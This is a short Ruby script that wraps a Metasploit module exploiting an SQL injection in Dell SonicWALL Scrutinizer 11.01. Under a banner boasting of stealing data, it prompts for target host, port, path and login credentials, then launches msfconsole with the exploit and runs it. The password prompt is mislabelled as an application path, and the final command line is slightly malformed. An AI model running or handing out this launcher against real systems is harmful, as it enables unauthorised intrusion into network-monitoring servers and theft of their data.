puts """

 	  Th3 M4d_Sc13nT15t is here to stay...
         Im coming coming to steal your data...

	    Dell SonicWALL Scrutinizer
	 11.01 methodDetail SQL Injection

		The target ports: 
  						 Default: 80, 0r  8080
"""

puts " [?] What is the Target? "
print "[!] ---> "

target = gets.chomp

puts " [?] What is the Port ? [Default is 80 or 8080]  "
print "[!] ---> "

port = gets.chomp

puts " [?] Base Application path ? [Default is '/']  "
print "[!] ---> "

path = gets.chomp

puts " [?] What is the Username? [Default is 'admin' or 'root']  "
print "[!] ---> "

user = gets.chomp

puts " [?] Base Application path ? [Default is 'admin' or 'root']  "
print "[!] ---> "

pass = gets.chomp
exec("msfconsole -x 'use exploit/multi/http/sonicwall_scrutinizer_methoddetail_sqli' -x 'setg RHOST #{target}' -x 'setg RPORT #{port}' -x 'set TARGETURI #{path}' -x 'set USERNAME #{user}' -x 'set PASSWORD #{pass}' -x 'run' 'run'")
